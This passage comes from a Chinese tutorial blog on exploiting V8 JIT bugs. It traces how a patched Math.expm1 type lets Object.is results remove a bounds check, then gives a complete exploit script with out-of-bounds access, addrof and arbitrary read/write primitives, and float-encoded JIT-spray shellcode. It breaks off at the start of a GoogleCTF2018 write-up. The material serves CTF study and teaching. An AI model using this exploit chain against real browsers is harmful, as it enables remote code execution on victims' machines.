class="mclose">)</span></span></span></span> -
PlainNumber：任何浮点数，不包括 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">−0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">−</span><span class="mord">0</span></span></span></span> -
Number：任何浮点数，包括 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">−0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">−</span><span class="mord">0</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>NaN</mtext></mrow><annotation encoding="application/x-tex">\text{NaN}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord text"><span class="mord">NaN</span></span></span></span></span> -
Numeric：任何浮点数，包括 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">−0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">−</span><span class="mord">0</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>NaN</mtext></mrow><annotation encoding="application/x-tex">\text{NaN}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord text"><span class="mord">NaN</span></span></span></span></span> 以及
<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>BigInt</mtext></mrow><annotation encoding="application/x-tex">\text{BigInt}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord text"><span class="mord">BigInt</span></span></span></span></span></p>
<p>根据前面的分析，下面这段 js 代码中 <code>console.log(foo(-0))</code>
应该输出 <code>false</code> 。然而实际运行的结果却是 <code>true</code>
。 <div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">x</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="title function_">is</span>(<span class="title class_">Math</span>.<span class="title function_">expm1</span>(x), -<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">foo</span>(<span class="number">0</span>);</span><br><span class="line">% <span class="title class_">OptimizeFunctionOnNextCall</span>(foo);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">foo</span>(-<span class="number">0</span>));</span><br></pre></td></tr></table></figure></div> 分析优化过程发现 <code>Math.expm1</code> 被初始成
<code>NumberExpm1</code> 并且在 simplified lowering 被替换为
<code>Float64Expm1</code> 。这个函数的返回值为 <code>Number</code>
类型，因此可以返回 -0 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/9c774edef143b023790941a7a0d5403b.png"
                     
alt="在这里插入图片描述" 
                > 为了避免出现上述情况，我们在向
<code>foo</code> 函数传入字符串类型参数，此时输出结果变为
<code>false</code> 。 <div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">x</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="title function_">is</span>(<span class="title class_">Math</span>.<span class="title function_">expm1</span>(x), -<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">foo</span>(<span class="number">0</span>);</span><br><span class="line">% <span class="title class_">OptimizeFunctionOnNextCall</span>(foo);</span><br><span class="line"><span class="title function_">foo</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">% <span class="title class_">OptimizeFunctionOnNextCall</span>(foo);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">foo</span>(-<span class="number">0</span>));</span><br></pre></td></tr></table></figure></div> 可以看到 typer 优化阶段后
<code>Math.expm1</code> 返回值类型被判断为 <code>PlainNumber</code> 或
<code>NaN</code> ，与前面的 patch 内容相符。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/4555ae74d8eb9ad733dcf5009665d5ed.png"
                     
alt="在这里插入图片描述" 
                > 这里可以看到 <code>Object.is</code> 被优化为
<code>SameValue</code> 。 <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ES section #sec-object.is</span></span><br><span class="line"><span class="function">Reduction <span class="title">JSCallReducer::ReduceObjectIs</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK_EQ</span>(IrOpcode::kJSCall, node-&gt;<span class="built_in">opcode</span>());</span><br><span class="line">  CallParameters <span class="type">const</span>&amp; params = <span class="built_in">CallParametersOf</span>(node-&gt;<span class="built_in">op</span>());</span><br><span class="line">  <span class="type">int</span> <span class="type">const</span> argc = <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(params.<span class="built_in">arity</span>() - <span class="number">2</span>);</span><br><span class="line">  Node* lhs = (argc &gt;= <span class="number">1</span>) ? NodeProperties::<span class="built_in">GetValueInput</span>(node, <span class="number">2</span>)</span><br><span class="line">                          : <span class="built_in">jsgraph</span>()-&gt;<span class="built_in">UndefinedConstant</span>();</span><br><span class="line">  Node* rhs = (argc &gt;= <span class="number">2</span>) ? NodeProperties::<span class="built_in">GetValueInput</span>(node, <span class="number">3</span>)</span><br><span class="line">                          : <span class="built_in">jsgraph</span>()-&gt;<span class="built_in">UndefinedConstant</span>();</span><br><span class="line">  Node* value = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(<span class="built_in">simplified</span>()-&gt;<span class="built_in">SameValue</span>(), lhs, rhs);</span><br><span class="line">  <span class="built_in">ReplaceWithValue</span>(node, value);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Replace</span>(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 搜索 <code>JSCallReducer</code>
发现这个优化位于 <code>InliningPhase</code> 阶段。 <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">InliningPhase</span> &#123;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">Run</span><span class="params">(PipelineData* data, Zone* temp_zone)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function">JSCallReducer <span class="title">call_reducer</span><span class="params">(&amp;graph_reducer, data-&gt;jsgraph(), data-&gt;broker(),</span></span></span><br><span class="line"><span class="params"><span class="function">                               data-&gt;info()-&gt;is_bailout_on_uninitialized()</span></span></span><br><span class="line"><span class="params"><span class="function">                                   ? JSCallReducer::kBailoutOnUninitialized</span></span></span><br><span class="line"><span class="params"><span class="function">                                   : JSCallReducer::kNoFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">                               data-&gt;dependencies())</span></span>;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
另外搜索 <code>SameValue</code> 发现存在如下优化： <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Reduction <span class="title">TypedOptimization::ReduceSameValue</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK_EQ</span>(IrOpcode::kSameValue, node-&gt;<span class="built_in">opcode</span>());</span><br><span class="line">  Node* <span class="type">const</span> lhs = NodeProperties::<span class="built_in">GetValueInput</span>(node, <span class="number">0</span>);</span><br><span class="line">  Node* <span class="type">const</span> rhs = NodeProperties::<span class="built_in">GetValueInput</span>(node, <span class="number">1</span>);</span><br><span class="line">  Type <span class="type">const</span> lhs_type = NodeProperties::<span class="built_in">GetType</span>(lhs);</span><br><span class="line">  Type <span class="type">const</span> rhs_type = NodeProperties::<span class="built_in">GetType</span>(rhs);</span><br><span class="line">  <span class="keyword">if</span> (lhs == rhs) &#123;</span><br><span class="line">    <span class="comment">// SameValue(x,x) =&gt; #true</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Replace</span>(<span class="built_in">jsgraph</span>()-&gt;<span class="built_in">TrueConstant</span>());</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (lhs_type.<span class="built_in">Is</span>(Type::<span class="built_in">Unique</span>()) &amp;&amp; rhs_type.<span class="built_in">Is</span>(Type::<span class="built_in">Unique</span>())) &#123;</span><br><span class="line">    <span class="comment">// SameValue(x:unique,y:unique) =&gt; ReferenceEqual(x,y)</span></span><br><span class="line">    NodeProperties::<span class="built_in">ChangeOp</span>(node, <span class="built_in">simplified</span>()-&gt;<span class="built_in">ReferenceEqual</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Changed</span>(node);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (lhs_type.<span class="built_in">Is</span>(Type::<span class="built_in">String</span>()) &amp;&amp; rhs_type.<span class="built_in">Is</span>(Type::<span class="built_in">String</span>())) &#123;</span><br><span class="line">    <span class="comment">// SameValue(x:string,y:string) =&gt; StringEqual(x,y)</span></span><br><span class="line">    NodeProperties::<span class="built_in">ChangeOp</span>(node, <span class="built_in">simplified</span>()-&gt;<span class="built_in">StringEqual</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Changed</span>(node);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (lhs_type.<span class="built_in">Is</span>(Type::<span class="built_in">MinusZero</span>())) &#123;</span><br><span class="line">    <span class="comment">// SameValue(x:minus-zero,y) =&gt; ObjectIsMinusZero(y)</span></span><br><span class="line">    node-&gt;<span class="built_in">RemoveInput</span>(<span class="number">0</span>);</span><br><span class="line">    NodeProperties::<span class="built_in">ChangeOp</span>(node, <span class="built_in">simplified</span>()-&gt;<span class="built_in">ObjectIsMinusZero</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Changed</span>(node);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rhs_type.<span class="built_in">Is</span>(Type::<span class="built_in">MinusZero</span>())) &#123;</span><br><span class="line">    <span class="comment">// SameValue(x,y:minus-zero) =&gt; ObjectIsMinusZero(x)</span></span><br><span class="line">    node-&gt;<span class="built_in">RemoveInput</span>(<span class="number">1</span>);</span><br><span class="line">    NodeProperties::<span class="built_in">ChangeOp</span>(node, <span class="built_in">simplified</span>()-&gt;<span class="built_in">ObjectIsMinusZero</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Changed</span>(node);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (lhs_type.<span class="built_in">Is</span>(Type::<span class="built_in">NaN</span>())) &#123;</span><br><span class="line">    <span class="comment">// SameValue(x:nan,y) =&gt; ObjectIsNaN(y)</span></span><br><span class="line">    node-&gt;<span class="built_in">RemoveInput</span>(<span class="number">0</span>);</span><br><span class="line">    NodeProperties::<span class="built_in">ChangeOp</span>(node, <span class="built_in">simplified</span>()-&gt;<span class="built_in">ObjectIsNaN</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Changed</span>(node);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rhs_type.<span class="built_in">Is</span>(Type::<span class="built_in">NaN</span>())) &#123;</span><br><span class="line">    <span class="comment">// SameValue(x,y:nan) =&gt; ObjectIsNaN(x)</span></span><br><span class="line">    node-&gt;<span class="built_in">RemoveInput</span>(<span class="number">1</span>);</span><br><span class="line">    NodeProperties::<span class="built_in">ChangeOp</span>(node, <span class="built_in">simplified</span>()-&gt;<span class="built_in">ObjectIsNaN</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Changed</span>(node);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (lhs_type.<span class="built_in">Is</span>(Type::<span class="built_in">PlainNumber</span>()) &amp;&amp;</span><br><span class="line">             rhs_type.<span class="built_in">Is</span>(Type::<span class="built_in">PlainNumber</span>())) &#123;</span><br><span class="line">    <span class="comment">// SameValue(x:plain-number,y:plain-number) =&gt; NumberEqual(x,y)</span></span><br><span class="line">    NodeProperties::<span class="built_in">ChangeOp</span>(node, <span class="built_in">simplified</span>()-&gt;<span class="built_in">NumberEqual</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Changed</span>(node);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">NoChange</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 搜索
<code>TypedOptimization</code> 发现在 typed lowering 和 load elimination
阶段调用了该优化。 <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">TypedLoweringPhase</span> &#123;</span><br><span class="line">  <span class="function"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span>* <span class="title">phase_name</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="string">&quot;typed lowering&quot;</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">Run</span><span class="params">(PipelineData* data, Zone* temp_zone)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function">TypedOptimization <span class="title">typed_optimization</span><span class="params">(&amp;graph_reducer, data-&gt;dependencies(),</span></span></span><br><span class="line"><span class="params"><span class="function">                                         data-&gt;jsgraph(), data-&gt;broker())</span></span>;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">LoadEliminationPhase</span> &#123;</span><br><span class="line">  <span class="function"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span>* <span class="title">phase_name</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="string">&quot;load elimination&quot;</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">Run</span><span class="params">(PipelineData* data, Zone* temp_zone)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function">TypedOptimization <span class="title">typed_optimization</span><span class="params">(&amp;graph_reducer, data-&gt;dependencies(),</span></span></span><br><span class="line"><span class="params"><span class="function">                                         data-&gt;jsgraph(), data-&gt;broker())</span></span>;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div> 在 <code>foo</code> 函数的第一次优化的
typed lowering 阶段 <code>SameValue</code> 被替换为
<code>ObjectIsMinusZero</code> 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/0a24359e5f939d4c8551a234cc07e2db.png"
                     
alt="在这里插入图片描述" 
                > 而在第二次优化时由于 <code>Math.expm1</code>
返回值一定不是 -0 因此 typed lowering 阶段 <code>SameValue</code>
被替换为 <code>false</code> 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/d1c0055602cf681c9bd6b3422f61bf99.png"
                     
alt="在这里插入图片描述" 
                > 接下来我们尝试用 <code>Object.is</code>
的返回值来访问 <code>JSArray</code> 。 <div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">x</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> oob_array = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>]</span><br><span class="line">    <span class="keyword">let</span> index = <span class="title class_">Object</span>.<span class="title function_">is</span>(<span class="title class_">Math</span>.<span class="title function_">expm1</span>(x), -<span class="number">0</span>);</span><br><span class="line">    index *= <span class="number">1337</span>;</span><br><span class="line">    <span class="keyword">return</span> oob_array[index];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">foo</span>(<span class="number">0</span>);</span><br><span class="line">% <span class="title class_">OptimizeFunctionOnNextCall</span>(foo);</span><br><span class="line"><span class="title function_">foo</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">% <span class="title class_">OptimizeFunctionOnNextCall</span>(foo);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">foo</span>(-<span class="number">0</span>));</span><br></pre></td></tr></table></figure></div> 发现由于 v8 认为用
<code>SameValue</code> 返回值计算出的 <code>index</code> 总是为 0 因此在
simplified lowering 阶段将 <code>CheckBound</code> 优化掉了。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/c4f24a562996c0a318aeac9e8ade8c96.png"
                     
alt="在这里插入图片描述" 
                > 然而我们可以通过某种手段使得
<code>Object.is</code> 返回 <code>true</code> 。 <div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">x</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> aux = &#123; <span class="attr">mz</span>: -<span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">let</span> index = <span class="title class_">Object</span>.<span class="title function_">is</span>(<span class="title class_">Math</span>.<span class="title function_">expm1</span>(x), aux.<span class="property">mz</span>);</span><br><span class="line">    <span class="keyword">let</span> oob_array = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>]</span><br><span class="line">    index *= <span class="number">1337</span>;</span><br><span class="line">    <span class="keyword">return</span> oob_array[index];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">foo</span>(<span class="number">0</span>);</span><br><span class="line">% <span class="title class_">OptimizeFunctionOnNextCall</span>(foo);</span><br><span class="line"><span class="title function_">foo</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">% <span class="title class_">OptimizeFunctionOnNextCall</span>(foo);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">foo</span>(-<span class="number">0</span>));</span><br></pre></td></tr></table></figure></div> 由于 -0
被放到一个 <code>JSObject</code> 的一个属性中，因此即使到了 load
elimination 阶段依旧没有吧 <code>SameValue</code> 优化成
<code>false</code> 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/746bb8d8f277526cbfab70ab11cfa495.png"
                     
alt="在这里插入图片描述" 
                > 到了 escape analysis 阶段
<code>LoadField</code> 从 <code>JSObject</code>
获取属性的操作被优化为立即数 -0 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/f1398ecafb6f42b8314fc0e08e429301.png"
                     
alt="在这里插入图片描述" 
                > 到了 simplified lowering 阶段，v8 根据
<code>Math.expm1</code> 返回值一定不是 -0 将后面的
<code>CheckBounds</code> 操作优化掉。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/0a7a5924c3c41c17750ff1d82afe9ef7.png"
                     
alt="在这里插入图片描述" 
                > <strong>然而 <code>Math.expm1</code>
不会返回 -0 是 patch 上去的内容，实际上 <code>Math.expm1</code>
是可以返回 -0 ，至于前面的 <code>Object.is</code> 返回
<code>false</code> 是因为返回值被优化成立即数 <code>false</code>
。</strong></p>
<p>因此可以越界访问数组 <code>oob_array</code> 。 ### 漏洞利用</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shellcode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="number">1.930800574428816e-246</span>,</span><br><span class="line">        <span class="number">1.9710610293119303e-246</span>,</span><br><span class="line">        <span class="number">1.9580046981136086e-246</span>,</span><br><span class="line">        <span class="number">1.9533830734556562e-246</span>,</span><br><span class="line">        <span class="number">1.961642575273437e-246</span>,</span><br><span class="line">        <span class="number">1.9399842868403466e-246</span>,</span><br><span class="line">        <span class="number">1.9627709291878714e-246</span>,</span><br><span class="line">        <span class="number">1.9711826272864685e-246</span>,</span><br><span class="line">        <span class="number">1.9954775598492772e-246</span>,</span><br><span class="line">        <span class="number">2.000505685241573e-246</span>,</span><br><span class="line">        <span class="number">1.9535148279508375e-246</span>,</span><br><span class="line">        <span class="number">1.9895153917617124e-246</span>,</span><br><span class="line">        <span class="number">1.9539853963090317e-246</span>,</span><br><span class="line">        <span class="number">1.9479373016495106e-246</span>,</span><br><span class="line">        <span class="number">1.97118242283721e-246</span>,</span><br><span class="line">        <span class="number">1.95323825426926e-246</span>,</span><br><span class="line">        <span class="number">1.99113905582155e-246</span>,</span><br><span class="line">        <span class="number">1.9940808572858186e-246</span>,</span><br><span class="line">        <span class="number">1.9537941682504095e-246</span>,</span><br><span class="line">        <span class="number">1.930800151635891e-246</span>,</span><br><span class="line">        <span class="number">1.932214185322047e-246</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">shellcode</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> oob_array = [<span class="number">.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">x</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> aux = &#123; <span class="attr">mz</span>: -<span class="number">0</span> &#125;;</span><br><span class="line">        <span class="keyword">let</span> index = <span class="title class_">Object</span>.<span class="title function_">is</span>(<span class="title class_">Math</span>.<span class="title function_">expm1</span>(x), aux.<span class="property">mz</span>);</span><br><span class="line">        oob_array = [<span class="number">.1</span>]</span><br><span class="line">        index *= <span class="number">4</span>;</span><br><span class="line">        oob_array[index] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">        <span class="title function_">foo</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">        <span class="title function_">foo</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">foo</span>(-<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">trigger</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object_array = [&#123;&#125;];</span><br><span class="line"><span class="keyword">var</span> double_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> rw_array = [<span class="number">.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">15</span>]);</span><br><span class="line"><span class="keyword">var</span> double_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">22</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(object_array_map));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] double array map: &quot;</span> + <span class="title function_">hex</span>(double_array_map));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">address_of</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">15</span>] = <span class="title function_">u2d</span>(object_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = obj;</span><br><span class="line">    oob_array[<span class="number">15</span>] = <span class="title function_">u2d</span>(double_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(object_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">offset</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">31</span>] = <span class="title function_">u2d</span>((offset - <span class="number">0x10n</span>) | <span class="number">1n</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(rw_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">offset, value</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">31</span>] = <span class="title function_">u2d</span>((offset - <span class="number">0x10n</span>) | <span class="number">1n</span>);</span><br><span class="line">    rw_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode_addr = <span class="title function_">address_of</span>(shellcode) + <span class="number">0x30n</span>;</span><br><span class="line"><span class="title function_">write</span>(shellcode_addr, <span class="title function_">read</span>(shellcode_addr) + <span class="number">0x6en</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">shellcode</span>();</span><br></pre></td></tr></table></figure></div>
<h2 id="例题googlectf2018-just-in-time">例题：GoogleCTF2018 Just In
Time</h2>
<h3 id="环境搭建-3">环境搭建</h3>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/v8_pwn/googlectf2018_jistintime" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd /path/to/v8</span><br><span class="line">git checkout 7.0.276.3 </span><br><span class="line">gclient sync </span><br><span class="line">patch -p1 &lt; ./path/to/addition-reducer.patch </span><br><span class="line">tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure></div> 需要注意的是在 simplified lowering 阶段想要去掉
<code>CheckBounds</code> 检查的一个必要条件是
<code>poisoning_level_</code> 等于 <code>kDontPoison</code> 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/c715c2cbead24ee0efb738494aecc84b.png"
                     
alt="在这里插入图片描述" 
                > 搜索 <code>poisoning_level_</code>
发现如下初始化代码： <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">SimplifiedLowering::<span class="built_in">SimplifiedLowering</span>(JSGraph* jsgraph,</span><br><span class="line">                                       JSHeapBroker* js_heap_broker, Zone* zone,</span><br><span class="line">                                       SourcePositionTable* source_positions,</span><br><span class="line">                                       NodeOriginTable* node_origins,</span><br><span class="line">                                       PoisoningMitigationLevel poisoning_level)</span><br><span class="line">    : <span class="built_in">jsgraph_</span>(jsgraph),</span><br><span class="line">      <span class="built_in">js_heap_broker_</span>(js_heap_broker),</span><br><span class="line">      <span class="built_in">zone_</span>(zone),</span><br><span class="line">      <span class="built_in">type_cache_</span>(TypeCache::<span class="built_in">Get</span>()),</span><br><span class="line">      <span class="built_in">source_positions_</span>(source_positions),</span><br><span class="line">      <span class="built_in">node_origins_</span>(node_origins),</span><br><span class="line">      <span class="built_in">poisoning_level_</span>(poisoning_level) &#123;&#125;</span><br></pre></td></tr></table></figure></div> 进一步搜索，发现
<code>poisoning_level_</code> 是被
<code>data-&gt;info()-&gt;GetPoisoningMitigationLevel()</code>
